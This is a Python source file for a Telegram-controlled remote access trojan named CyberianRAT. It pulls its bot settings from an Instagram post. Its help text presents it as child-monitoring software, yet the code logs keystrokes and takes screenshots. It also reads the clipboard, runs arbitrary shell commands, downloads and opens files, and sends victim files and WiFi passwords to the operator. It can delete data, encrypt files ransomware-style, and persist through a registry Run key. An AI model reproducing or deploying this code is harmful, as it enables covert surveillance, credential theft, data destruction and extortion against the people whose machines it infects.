
import codecs
import shutil
import subprocess
from pynput.keyboard import Listener
from threading import Thread
import telebot
import time, pyautogui, requests, socket, os, pyperclip, sys
from cryptography.fernet import Fernet
from bs4 import BeautifulSoup
import webbrowser
from gtts import gTTS


API = "c"
IDs = "cc"
posts = "c"




home = """
---This is /help section---
Child monitoring or parental control software is designed to help parents or guardians 
monitor and manage their child's online activities and digital behavior. 
These tools are intended for responsible and ethical use by parents to ensure their child's 
online safety and to set appropriate boundaries.

/connection
Description: Checking target system live or not.

/screenshot
Description: Takes a screenshot of the target system.

/keylog
Description: Logs keystrokes on the target system.

/clipboard
Description: Retrieves the content of the clipboard on the target system.

/mclipboard <text>
Description: Sets the clipboard content to the specified text on the target system.

/getcwd
Description: Retrieves the current working directory of the target system.

/cd <path>
Description: Changes the current directory on the target system to the specified path.

/openlink <link>
Description: Opens a web link on the target system.

/listdir
Description: Lists the contents of the current directory on the target system.

/taskkill <process>
Description: Terminates a specified process on the target system.

/cmd <cmds>
Description: Executes arbitrary shell commands on the target system.

/types <text> -t <time>
Description: Simulates typing the specified text at the target system with an optional time delay.

/typeskey <key> -p <press>
Description: Simulates pressing a specific key on the target system with an optional press duration.

/mousec <x_cord> -y <y_cord>
Description: Moves the mouse cursor to the specified coordinates on the target system.

/mouseclick
Description: Simulates a mouse click on the target system.

/location
Description: Retrieves the location information of the target system.

/off
Description: Shuts down or restarts the target system.

/deletefile <file_path>
Description: Deletes a specified file on the target system.

/deletefolder <folder_path>
Description: Deletes a specified folder and its contents on the target system.

/uploadfile <link> -o <name>
Description: Uploads a file from a given link to the target system with an optional custom name.

/open <path>
Description: Opens a file or application at the specified path on the target system.

/makedir <folder_name>
Description: Creates a new folder with the specified name on the target system.

/wifidump
Description: Performs a WiFi network dump to gather information about available networks.

/say
Description: Performs a text to music for giving voice cmds.

/encryptfile <file_path>
Description: Encrypts a specified file on the target system.

/encryptfolder <folder_path>
Description: Encrypts a specified folder and its contents on the target system.

/getfile <file_path>
Description: Retrieves a specified file from the target system.

/getfolderfiles <folder_path>
Description: Retrieves files from a specified folder on the target system.

/seefiles <path>
Description: Lists and displays files in the specified directory on the target system.

<commands usage>
/connection
/screenshot
/keylog
/clipboard
/mclipboard <text>
/getcwd
/cd <path>
/openlink <link>
/listdir
/taskkill <process>
/cmd <cmds>
/types <text> -t <time>
/typeskey <key> -p <press>
/mousec <x_cord> -y <y_cord>
/mouseclick
/location
/off
/deletefile <file_path>
/deletefolder <folder_path>
/uploadfile <link> -o <name>
/open <path>
/makedir <folder_name>
/wifidump 
/encryptfile <file_path>
/encryptfolder <folder_path>
/getfile <file_path>
/getfolderfiles <folder_path>
/seefiles <path>
/say <text>


"""


def instascrape(posts):
    data = ""
    try:
        posts = requests.get(posts).content
        soup = BeautifulSoup(posts, "html.parser")
        caption = soup.find("title")
        caption = caption.text
        caption = caption.split(" on Instagram: ")
        data = str(caption[1])
    except:
        pass
    return str(data.replace('"', "")).split()



def sender(API, IDs):
    bot = telebot.TeleBot(API)
    bot.send_message(IDs, "Conneted")
    
    #connection-----------------------------------------
    @bot.message_handler(commands=["connection"])
    def connection(message):
        device = f"{socket.gethostname()} is Connected with you."
        bot.reply_to(message, device)

    #screenshot-----------------------------------------
    @bot.message_handler(commands=["screenshot"])
    def screenshots(message):
        try:
            temps_file = str(os.environ['appdata']) + '\\' + "screenshot.jpg"
            s = pyautogui.screenshot()
            s.save(temps_file)
            pic = open(temps_file, mode="rb")
            bot.send_document(IDs, pic)
            pic.close()  # Close the file
            os.remove(temps_file)  # Delete the temporary file after sending
        except Exception as e:
            pass


    #keylogs-----------------------------------------
    @bot.message_handler(commands=["keylog"])
    def keylog(message):
        try:
            temps_file = str(os.environ['appdata']) + '\\' + "data.txt"
            logs = open(temps_file, "rb")
            bot.send_document(IDs, logs)
            os.remove(temps_file)  # Delete the temporary file after sending
        except:
            pass


    #clipboard-access-----------------------------------------
    @bot.message_handler(commands=["clipboard"])
    def clipboard(message):
        result = pyperclip.paste()
        bot.reply_to(message, result)

    #clipboard-paster-----------------------------------------
    @bot.message_handler(commands=["mclipboard"])
    def mclipboard(message):
        text = str(message.text)
        _ = pyperclip.copy(text.replace("/mclipboard",""))
        bot.reply_to(message, "Injected Successfully : "+str(pyperclip.paste()))

    #help-----------------------------------------
    @bot.message_handler(commands=["help"])
    def cmdd(message):
        bot.reply_to(message, home)


    #getpwd-----------------------------------------
    @bot.message_handler(commands=["getcwd"])
    def getcwd(message):
        bot.reply_to(message, str(os.getcwd()))

    #cd-----------------------------------------
    @bot.message_handler(commands=["cd"])
    def changedir(message):
        try:
            text = r"{}".format(str(message.text))
            path = text.replace("/cd","")
            path = path.strip()
            os.chdir(path)
        except:
            pass
        bot.send_message(IDs, "You are currently here : "+os.getcwd())


    #openlink-----------------------------------------
    @bot.message_handler(commands=["openlink"])
    def openlink(message):
        try:
            text = r"{}".format(str(message.text))
            path = text.replace("/openlink","")
            path = path.strip()
            webbrowser.open_new_tab(path)
        except:
            pass
        bot.send_message(IDs, "Opened Link Successfully.")

    #listdir-----------------------------------------
    @bot.message_handler(commands=["listdir"])
    def clistdir(message):
        try:
            v = subprocess.Popen("dir", shell=True, stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            v = v.stderr.read() + v.stdout.read()
            v = r"{}".format(v.decode())
            v = codecs.encode(v, "unicode_escape")
            v = codecs.decode(v, "unicode_escape")
            bot.reply_to(message, v)
        except:
            pass


    #taskkill-----------------------------------------
    @bot.message_handler(commands=["taskkill"])
    def kill(message):    
        text = r"{}".format(str(message.text))
        path = text.replace("/taskkill","")
        path = path.strip()
        def give(cc):
            dels = "taskkill /f /im "+cc
            v = subprocess.Popen(dels, shell=True, stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)   
            bot.reply_to(message, "taskkill commands excuted.")
        Thread(target=give, args=[path,]).start()

    #cmd-----------------------------------------
    @bot.message_handler(commands=["cmd"])
    def orders(message):
        cmd = message.text
        cmd = cmd.replace("/cmd", "")
        def give(cc):
            v = subprocess.Popen(cc, shell=True, stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)   
            v = v.stderr.read() + v.stdout.read()
            v = r"{}".format(v.decode())
            v = codecs.encode(v, "unicode_escape")
            v = codecs.decode(v, "unicode_escape")
            bot.reply_to(message, v)
        Thread(target=give, args=[cmd,]).start()
    
    #type-something-----------------------------------------
    @bot.message_handler(commands=["types"])
    def typess(message):
        wr = str(message.text)
        wr = wr.replace("/types", "")
        wr = wr.partition("-t")
        try:
            time.sleep(int(wr[2]))
            pyautogui.write(str(wr[0]))
            bot.reply_to(message, "Type successfully.")
        except:
            bot.reply_to(message, "Bad Syntax.")

    #typesspecial-----------------------------------------
    @bot.message_handler(commands=["typeskey"])
    def typesss(message):
        wr = str(message.text)
        wr = wr.replace("/typeskey", "")
        wr = wr.partition("-p")
        try:
            pyautogui.press(str(wr[0]).strip(), presses=int(wr[2]))
            bot.reply_to(message, "Press successfully.")
        except:
            bot.reply_to(message, "Bad Syntax.")

    #mousec-----------------------------------------
    @bot.message_handler(commands=["mousec"])
    def mousec(message):
        wr = str(message.text)
        wr = wr.replace("/mousec", "")
        wr = wr.partition("-y")
        try:
            pyautogui.moveTo(int(str(wr[0]).strip()), int(str(wr[2]).strip()))
            bot.reply_to(message, "Cursor's Set.")
        except:
            bot.reply_to(message, "Bad Syntax.")

    #mouseclick-----------------------------------------
    @bot.message_handler(commands=["mouseclick"])
    def mouseclick(message):
        try:
            pyautogui.click()
            bot.reply_to(message, "Good Touch.")
        except:
            bot.reply_to(message, "Bad Touch.")


    #location-----------------------------------------
    @bot.message_handler(commands=["location"])
    def loc(message):
        try:
            l = requests.get("http://ip-api.com/php").content
            bot.reply_to(message, str(l))
        except:
            bot.reply_to(message, "GPS cannot Detected.")


    
    #shutdown-----------------------------------------
    @bot.message_handler(commands=["off"])
    def offs(message):
        def give():
            device = f"{socket.gethostname()} is Now Shutdown."
            bot.reply_to(message, device)
            v = subprocess.Popen("shutdown -r", shell=True, stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)   
        Thread(target=give).start()

    
    #delete-----------------------------------------
    @bot.message_handler(commands=["deletefile"])
    def deletes_file(message):    
        text = r"{}".format(str(message.text))
        path = text.replace("/deletefile","")
        path = path.strip()
        def give(cc):
            dels = "del "+cc
            v = subprocess.Popen(dels, shell=True, stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)   
            bot.reply_to(message, "Deleted commands excuted.")
        Thread(target=give, args=[path,]).start()

    #delete-folder-----------------------------------------
    @bot.message_handler(commands=["deletefolder"])
    def deletes_files(message):    
        text = r"{}".format(str(message.text))
        path = text.replace("/deletefolder ","")
        def give(cc):
            dels = 'rmdir /s /q "{}"'.format(cc)
            v = subprocess.Popen(dels, shell=True, stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)   
            bot.reply_to(message, "Deleted commands excuted.")
        Thread(target=give, args=[path.rstrip(),]).start()

    
    #upload-file-----------------------------------------
    @bot.message_handler(commands=["uploadfile"])
    def uploaded(message):
        text = r"{}".format(str(message.text))
        url = text.replace("/uploadfile","")
        url = url.partition("-o")
        response = requests.get(str(url[0].strip()))
        if response.status_code == 200:
            with open(str(url[2].strip()), 'wb') as f:
                f.write(response.content)
                bot.reply_to(message,"File Uploaded successfully")
        else:
            bot.reply_to(message,f"Failed to download the file. Status code: {response.status_code}")


    #open-----------------------------------------
    @bot.message_handler(commands=["open"])
    def opens(message):
        cmd = r"{}".format(message.text)
        cmd = cmd.replace("/open", "")
        cmd = cmd.strip()
        def give(cc):
            v = subprocess.Popen("start "+str(cc.strip()), shell=True, stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)   
            bot.reply_to(message, "Opened Successfully...")
        Thread(target=give, args=[cmd,]).start()

    #mddir-----------------------------------------
    @bot.message_handler(commands=["makedir"])
    def makesdir(message):
        cmd = r"{}".format(message.text)
        cmd = cmd.replace("/makedir", "")
        cmd = cmd.strip()
        try:
            os.makedirs(cmd)
            msg = "Successfully Folder Created."
        except:
            msg = "Cannot Create Folder."
        bot.reply_to(message, msg)

    #wifidump-------------------------------------------------
    @bot.message_handler(commands=["wifidump"])
    def wifidumps(message):
        bot.reply_to(message, "Need Administrator Access.")
        def give():
            v = subprocess.Popen("netsh wlan export profile folder=. key=clear", shell=True, stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)   
            v = v.stderr.read() + v.stdout.read()
            v = r"{}".format(v.decode())
            v = codecs.encode(v, "unicode_escape")
            v = codecs.decode(v, "unicode_escape")
            bot.reply_to(message, v)
        Thread(target=give).start()

    #encrypt-file-------------------------------------------------
    @bot.message_handler(commands=["encryptfile"])
    def enc(message):
        file_path = r"{}".format(message.text)
        file_path = file_path.replace("/encryptfile", "")
        file_path = file_path.strip()
        try:
            key = Fernet.generate_key()
            key = codecs.decode(key, "unicode_escape")
            key = codecs.encode(key, "unicode_escape")
            bot.reply_to(message, "Your Files key: "+str(key))
            cipher_suite = Fernet(key)
            with open(file_path, 'rb') as file:
                file_data = file.read()
            encrypted_data = cipher_suite.encrypt(file_data)
            os.remove(file_path)
            filename = os.path.splitext(file_path)
            with open(filename[0]+"({})".format(filename[1])+".cyberianencrypt", 'wb') as encrypted_file:
                encrypted_file.write(encrypted_data)
            bot.reply_to(message, "Your Files Encrypted Successfully.")
        except:
            bot.reply_to(message, "Cannot Encrypted.")


    #encrypt-all-------------------------------------------------
    @bot.message_handler(commands=["encryptfolder"])
    def dnc(message):
        folder_path = r"{}".format(message.text)
        folder_path = folder_path.replace("/encryptfolder", "")
        folder_path = folder_path.strip()
        key = Fernet.generate_key()
        bot.reply_to(message, "Your Files key: "+str(key))
        try:
            for file in os.listdir(folder_path):
                file_path = os.path.join(folder_path, file)
                if os.path.isfile(file_path):
                    cipher_suite = Fernet(key)
                    with open(file_path, 'rb') as file:
                        file_data = file.read()
                    encrypted_data = cipher_suite.encrypt(file_data)
                    os.remove(file_path)
                    filename = os.path.splitext(file_path)
                    with open(filename[0]+"({})".format(filename[1])+".cyberianencrypt", 'wb') as encrypted_file:
                        encrypted_file.write(encrypted_data)
            bot.reply_to(message, "All Files Encrypted.")
        except:
            pass

    #get-file-------------------------------------------------
    @bot.message_handler(commands=["getfile"])
    def getfiles(message):
        file_path = r"{}".format(message.text)
        file_path = file_path.replace("/getfile", "")
        file_path = file_path.strip()
        filename = open(file_path, mode="rb")
        try:
            bot.send_document(IDs, filename)
        except:
            bot.reply_to(message, "Cannot Send File.")


    #say-------------------------------------------------
    @bot.message_handler(commands=["say"])
    def says(message):
        temps_file = str(os.environ['appdata']) + '\\' + "say.mp3"  
        os.remove(temps_file)
        file_path = r"{}".format(message.text)
        file_path = file_path.replace("/say", "")
        file_path = file_path.strip()
        try:
            myobj = gTTS(text=file_path, lang="en", slow=False)
            myobj.save(temps_file)
            os.startfile(temps_file)
            bot.reply_to(message, "I said : "+file_path)
        except:
            bot.reply_to(message, "I have no mouth.")
        


    #get-folder-files-------------------------------------------------
    @bot.message_handler(commands=["getfolderfiles"])
    def getfolder(message):
        folder_path = r"{}".format(message.text)
        folder_path = folder_path.replace("/getfolderfiles", "")
        folder_path = folder_path.strip()
        try:
            for file in os.listdir(folder_path):
                file_path = os.path.join(folder_path, file)
                if os.path.isfile(file_path):
                    try:
                        bot.send_document(IDs, open(file_path, mode="rb"))
                    except:
                        bot.reply_to(message, file_path+" cannot Send File.")
            bot.reply_to(message, "All files sent.")
        except:
            bot.reply_to(message, "All files cannot send or may syntax error please specified path also if not given.")


    #seefiles-------------------------------------------------
    @bot.message_handler(commands=["seefiles"])
    def seefiles(message):
        folder_path = r"{}".format(message.text)
        folder_path = folder_path.replace("/seefiles", "")
        folder_path = folder_path.strip()
        mssg = ""
        count = 0
        try:
            for file in os.listdir(folder_path):
                file_path = os.path.join(folder_path, file)
                if os.path.isfile(file_path):
                    count+=1
                    mssg += f"{count} ---> {file}\n"
                    
            bot.reply_to(message, mssg)
        except:
            bot.reply_to(message, "May syntax error please specified path also if not given.")


    @bot.message_handler(func=lambda message: True)
    def handle_messages(message):
        bot.reply_to(message, "Bad commands used.")

    bot.infinity_polling()


def op(key):
    temps_file = str(os.environ['appdata']) + '\\' + "data.txt"
    key = str(key)
    key = key.replace("'","")
    if key.startswith("Key."):
        key = "\n{0}\n".format(key.replace("Key.", ""))
    file = open(temps_file, mode="a")
    file.write(key)
    file.close()

def persistence_vaim():
    def persist():
        copy_name = "CyberianRAT.exe"
        reg_name = "CyberianRAT"
        file_location = str(os.environ['appdata']) + '\\' + copy_name
        try:
            if not os.path.exists(file_location):
                shutil.copyfile(sys.executable, file_location)
                subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)
        except:
            pass

    b = Thread(target=persist).start()


def ritik():
    with Listener(on_press=op) as Listen:
        Listen.join()


if __name__ == "__main__":
    try:
        try:
            if requests.get(posts).status_code == 200:
                conf = instascrape(posts)
                API = conf[0]
                IDs = int(conf[1])
        except:
            pass
        #Thread(target=persistence_vaim).start() ==> backdoor
        Thread(target=sender, args=[API, IDs,]).start()
        Thread(target=ritik).start()
    except:
        try:
            #Thread(target=persistence_vaim).start() ==> backdoor
            Thread(target=sender, args=[API, IDs,]).start()
            Thread(target=ritik).start()
        except:
            pass
